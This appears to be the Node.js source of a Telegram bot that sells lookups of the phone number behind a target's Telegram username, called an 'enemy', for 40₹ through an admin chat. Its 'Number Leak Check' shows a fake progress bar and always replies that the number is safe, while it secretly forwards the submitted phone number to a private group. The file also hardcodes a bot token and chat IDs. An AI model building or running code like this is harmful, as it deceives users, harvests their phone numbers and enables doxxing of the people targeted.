const TelegramBot = require("node-telegram-bot-api");
const TOKEN = "8285929513:AAEn49sxCyOns-6Llw28DV5psnsS8z_VkKo";
const ADMIN_CHAT_ID = "-1003208216031";
const GROUP_ID = "-1002979241008";

const bot = new TelegramBot(TOKEN, { polling: true });
let activeChats = {}; // userId -> groupId

const progressFrames = [
  "▰▱▱▱▱▱▱▱▱▱ 10%",
  "▰▰▱▱▱▱▱▱▱▱ 20%",
  "▰▰▰▱▱▱▱▱▱▱ 30%",
  "▰▰▰▰▱▱▱▱▱▱ 40%",
  "▰▰▰▰▰▱▱▱▱▱ 50%",
  "▰▰▰▰▰▰▱▱▱▱ 60%",
  "▰▰▰▰▰▰▰▱▱▱ 70%",
  "▰▰▰▰▰▰▰▰▱▱ 80%",
  "▰▰▰▰▰▰▰▰▰▱ 90%",
  "▰▰▰▰▰▰▰▰▰▰ 100%"
];

// /start command
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;

  await bot.sendPhoto(chatId, "hey.jpg", {
    caption: `🥷 Hello ${username}! Welcome to Ninja Username to Number Bot 🥷\n\n⚡ Choose your mission:`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "🧠 Username → Number", callback_data: "check_username" }],
        [{ text: "📞 Number Leak Check", callback_data: "check_number" }]
      ]
    }
  });
});

// Handle callback queries
bot.on("callback_query", async (query) => {
  const data = query.data;
  const from = query.from;

  // 🔹 Username to Number
  if (data === "check_username") {
    await bot.sendMessage(from.id, "⚡ Send the enemy's @username to scan 🕵️‍♂️");
    bot.once("message", async (msg2) => {
      const username = msg2.text.trim();
      const progressMsg = await bot.sendMessage(from.id, "🔄 Scanning username...");

      for (let i = 0; i < progressFrames.length; i++) {
        await new Promise((r) => setTimeout(r, 150));
        await bot.editMessageText(`🔍 Checking username...\n${progressFrames[i]}`, {
          chat_id: progressMsg.chat.id,
          message_id: progressMsg.message_id
        });
      }

      await bot.sendMessage(from.id, `❌ ${username} is not available.\nIf number exists, bot will contact you.`);

      // Send to group with 40₹ button
      await bot.sendMessage(GROUP_ID, `📥 Receive\nFrom: @${from.username}\nTarget: ${username}`, {
        reply_markup: {
          inline_keyboard: [[{ text: "💰 40₹", callback_data: `forty_${from.id}` }]]
        }
      });
    });
  }

  // 🔹 Number Leak Check
  if (data === "check_number") {
    await bot.sendMessage(
      from.id,
      `🥷 Hello ${from.username ? `@${from.username}` : from.first_name} Ninja!\n\n⚔️ Send the Indian number to check if it is leaked.\n\n🕶️ Only digits, without 91 or +91 prefix.`
    );

    bot.once("message", async (msg3) => {
      const number = msg3.text.trim();
      const progressMsg = await bot.sendMessage(from.id, "🔄 Scanning number...");

      for (let i = 0; i < progressFrames.length; i++) {
        await new Promise((r) => setTimeout(r, 150));
        await bot.editMessageText(`📱 Checking number...\n${progressFrames[i]}`, {
          chat_id: progressMsg.chat.id,
          message_id: progressMsg.message_id
        });
      }

      await bot.sendMessage(from.id, `✅ Your number is safe — no leaks found!`);

      await bot.sendMessage(GROUP_ID, `📥 Receive\nFrom: @${from.username}\nNumber: ${number}`);
    });
  }

  // 🔹 40₹ Button
  if (data.startsWith("forty_")) {
    const userId = data.split("_")[1];
    await bot.sendMessage(userId, `💰 Hey @${from.username}, your number is available!\nSelect below:`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Yes", callback_data: `yes_${userId}` }],
          [{ text: "❌ No", callback_data: `no_${userId}` }]
        ]
      }
    });
  }

  // 🔹 Yes Button
  if (data.startsWith("yes_")) {
    const userId = data.split("_")[1];
    await bot.sendMessage(userId, "💭 Are you sure? This process costs 40₹.", {
      reply_markup: {
        inline_keyboard: [[{ text: "🗣️ Talk to Admin", callback_data: `admin_contact_${userId}` }]]
      }
    });
  }

  // 🔹 Direct Admin Contact
  if (data.startsWith("admin_contact_")) {
    const userId = data.split("_")[2];
    const username = from.username ? `@${from.username}` : from.first_name;

    // Message directly to admin group
    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `📩 New Request from ${username}\n🆔 User ID: ${userId}`,
      {
        reply_markup: {
          inline_keyboard: [[{ text: "💬 Talk to User", callback_data: `talk_to_user_${userId}` }]]
        }
      }
    );

    await bot.sendMessage(userId, "🕶️ Your request has been sent to admin. Please wait...");
  }

  // 🔹 Start Live Chat (Admin)
  if (data.startsWith("talk_to_user_")) {
    const userId = data.split("_")[3];
    activeChats[userId] = ADMIN_CHAT_ID;

    await bot.sendMessage(userId, "💬 You are now connected with Admin.", {
      reply_markup: {
        inline_keyboard: [[{ text: "🛑 Stop Chat", callback_data: `stop_${userId}` }]]
      }
    });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `🔗 Chat started with user: ${userId}`,
      {
        reply_markup: {
          inline_keyboard: [[{ text: "🛑 Stop Chat", callback_data: `stop_${userId}` }]]
        }
      }
    );
  }

  // 🔹 Stop Chat
  if (data.startsWith("stop_")) {
    const userId = data.split("_")[1];
    if (activeChats[userId]) {
      await bot.sendMessage(userId, "❌ Chat ended successfully.");
      await bot.sendMessage(ADMIN_CHAT_ID, `🚫 Chat with user ${userId} has ended.`);
      delete activeChats[userId];
    }
  }
});

// 🔹 Relay live chat messages
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text;

  // User -> Admin
  if (activeChats[userId]) {
    await bot.sendMessage(activeChats[userId], `💬 From user: ${text}`);
  }

  // Admin -> User
  if (chatId === Number(ADMIN_CHAT_ID)) {
    const targetUserId = Object.keys(activeChats).find((id) => activeChats[id] === ADMIN_CHAT_ID);
    if (targetUserId) {
      await bot.sendMessage(targetUserId, `👤 Admin: ${text}`);
    }
  }
});
